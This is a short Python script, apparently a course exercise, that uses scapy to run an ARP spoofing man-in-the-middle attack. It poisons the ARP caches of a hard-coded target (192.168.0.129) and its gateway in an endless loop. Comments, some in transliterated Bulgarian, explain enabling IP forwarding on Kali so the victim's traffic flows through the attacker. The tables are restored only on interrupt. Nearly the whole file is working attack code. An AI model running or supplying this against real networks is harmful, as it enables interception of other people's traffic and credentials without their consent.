#!usr/bin/env python3


#za da raboti tva trqa da se pusne ip_forward - za da moje da ti minava trafika in out ot kali
# v kozolata:
# echo 1 > /proc/sys/net/ipv4/ip_forward 

"""
>>> scapy.ls(scapy.ARP)
hwtype     : XShortField                         = (1)
ptype      : XShortEnumField                     = (2048)
hwlen      : FieldLenField                       = (None)
plen       : FieldLenField                       = (None)
op         : ShortEnumField                      = (1)
hwsrc      : MultipleTypeField                   = (None)
psrc       : MultipleTypeField                   = (None)
hwdst      : MultipleTypeField                   = (None)
pdst       : MultipleTypeField                   = (None)

"""

import scapy.all as scapy 
import time
import sys

def get_mac(ip):                                                                                                   
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #broadcast MAC
    arp_request_broadcast = broadcast/arp_request # combine the two varaibles (scapy allows us to do that) it is called packet
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    try:
        if answered_list == "":
            return answered_list[0][1].hwsrc    

        return answered_list[0][1].hwsrc    
    except IndexError as error:
        print("[-]Exeption list index")
        print(error)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) #op=2 - ARP response , op=1 ARP request #hwdst - mac of the destination
    scapy.send(packet, verbose=False)


def restore(dest_ip, source_ip): #restores ARP table back to normal
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False) # count 4 prashta 4 takiva paketa za da sme sigurni che sa pristignali


target_ip = "192.168.0.129"
gateway_ip = "192.168.0.1"
    
try:
    sent_packets_count = 0
    while True:
        
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r-- Packets sent: " + str(sent_packets_count), end="")  #Dynamic print
        time.sleep(2)
        
except KeyboardInterrupt:
    print(" \n-- Resetting ARP tables")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    
